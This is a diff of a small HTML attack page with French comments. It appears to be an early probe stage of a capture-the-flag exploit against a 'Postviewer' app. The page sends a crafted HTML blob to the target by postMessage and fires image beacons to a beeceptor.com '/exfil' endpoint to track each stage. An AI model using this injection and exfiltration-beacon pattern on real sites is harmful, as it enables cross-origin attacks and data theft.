@@ -1,30 +1,25 @@
-<!-- index.html – étape 1 -->
 <!doctype html>
 <html>
 <body>
 <script>
-/* Ping immédiat pour confirmer que la page externe est chargée */
+/* ping : la page externe est chargée */
 new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
 
 (async () => {
-  /* ► 1. Petit HTML sans <script>, uniquement un onload */
+  /* --- blob HTML minimal : uniquement une balise <img> --- */
   const epic = `
-    <html>
-      <body onload="
-        new Image().src='https://webtest.free.beeceptor.com/exfil?f=blob_start'
-      ">
-      </body>
-    </html>`;
+    <html><body>
+      <img src="https://webtest.free.beeceptor.com/exfil?f=blob_start">
+    </body></html>`;
 
-  const blob = new Blob([epic], { type: 'text/html' });
+  const blob = new Blob([epic], {type:'text/html'});
 
-  /* ► 2. Envoi à Postviewer */
+  /* --- envoi à Postviewer --- */
   window.postMessage({
-    type: 'share',
-    files: [{ blob, name: 'probe.html', cached: false }]
+    type:'share',
+    files:[{blob, name:'probe.html', cached:false}]
   }, '*');
 
-  /* Ping pour confirmer que postMessage est bien parti */
   new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
 })();
 </script>
